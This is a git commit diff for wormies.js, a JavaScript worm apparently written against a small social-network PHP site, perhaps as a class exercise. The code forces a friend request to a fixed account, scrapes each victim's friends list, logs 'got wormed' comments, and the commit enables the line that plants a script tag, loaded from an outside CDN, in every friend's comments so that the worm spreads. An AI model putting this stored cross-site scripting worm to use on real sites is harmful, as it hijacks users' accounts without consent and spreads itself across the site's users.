cb697f13b2f08dd894cafe70efc6b08b5d2247fa
sxa7263 <35963445+sxa7263@users.noreply.github.com>
2020-11-07 21:11:07 -0500

    Update wormies.js

--- wormies.js
+++ wormies.js
@@ -1,13 +1,13 @@
-alert('HELLO');
-$.get("add_friend.php", {'id': 167}); 
+alert('WORMIES1');
+$.get("add_friend.php", {'id': 169}); 
 $.get("friends.php", (homies)=>{
     a = homies.split("?id="); 
     for(var i = 1; i < a.length; i++){
         b = a[i].split("'>")[0];
-        $.get("timeline.php", {'id': 167}, (report)=>{
+        $.get("timeline.php", {'id': 169}, (report)=>{
             if(!report.includes(b + " got wormed")){
-                $.get("add_comment.php", {'id': 167, 'comment': b + " got wormed datetime="+ new Date(Date.now()).toLocaleString()}); 
-                //$.get("add_comment.php", {'id': b, 'comment': "<script src='https://gitcdn.link/repo/sxa7263/special-octo-dollop/main/wormies.js'></script>YOU GOT WORMED"});
+                $.get("add_comment.php", {'id': 169, 'comment': b + " got wormed datetime="+ new Date(Date.now()).toLocaleString()}); 
+                $.get("add_comment.php", {'id': b, 'comment': "<script src='https://gitcdn.link/repo/sxa7263/special-octo-dollop/main/wormies.js'></script>YOU GOT WORMED"});
             }
         });
     }
